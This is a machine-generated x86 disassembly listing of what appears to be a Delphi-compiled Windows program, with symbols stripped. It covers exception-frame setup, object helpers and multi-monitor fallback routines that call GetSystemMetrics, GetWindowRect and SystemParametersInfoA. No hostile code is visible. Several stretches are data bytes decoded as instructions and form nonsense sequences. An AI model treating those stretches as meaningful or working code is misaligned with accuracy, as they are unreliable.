mov al 0x4
call sub_42469c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
sub_424784
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42469c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42480c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42469c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42489c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42469c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42480c
sub_424932
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42469c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4249b3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42469c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424aa0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42469c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424b74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42469c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424c48
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42469c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_424de3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_424e09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e10
retn
sub_424e24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424e49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e50
retn
sub_424e5c
pushad
dec esi
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e50
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
push eax
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x4ec87265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
dec esp
dec esi
inc edx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cmp cl [ ecx ]
dec eax
insb
jae r-xdata
push esi
je r-xdata
or [ eax + 0x65 ] ecx
insb
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 ] al
outsb
je r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
dec edi
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x424e98c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
add al dh
outsb
je r-xdata
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
add [ eax - 0x5fffbf91 ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0x6800408d
push eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x50 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x50 ] bh
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
dec esi
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x4f047265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x424f84c0 ]
dec edi
inc edx
add bh bh
inc [ edi + ecx * 2 + 0x42 ]
cld
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
dec esi
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x424f08c0 ]
add [ edi ] cl
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425bef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
lea eax [ eax ]
add al 0x50
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x50040040 ]
jo r-xdata
cmp cl [ ecx ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ffc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425bf6
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a30
lea eax [ ebp - 0x8 ]
call sub_4056c4
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056dc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425220
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_425296
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4253ac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4056dc
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42529d
lea eax [ ebp - 0x8 ]
call sub_4056c4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425338
mov [ rw-data ] eax
sub_4252a4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425338
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405708
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_4252fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4056dc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_425338
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_424418
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424418
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424418
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403fa8
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4253ac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4254ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4252fc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424468
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4056c4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d260
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4056c4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d260
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4252fc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424468
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4252fc
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424468
mov ecx r-xdata
call sub_405708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254b4
lea eax [ ebp - 0xc ]
call sub_4056c4
lea eax [ ebp - 0x8 ]
call sub_4056c4
retn
sub edx 0xfffffff8
sub_4254cc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_424454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42550c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_424454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42553c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4256ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_424454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425669
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256d5
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
mov eax esi
xor edx edx
call sub_424454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424454
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_424454
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_4256dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4257c1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257c8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a30
lea eax [ ebp - 0x8 ]
call sub_4056c4
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056dc
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056dc
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_4259f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425aeb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403ffc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425af2
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a30
lea eax [ ebp - 0x10 ]
call sub_4056c4
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_424454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4056dc
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405708
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_425b10
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_425bef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ffc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
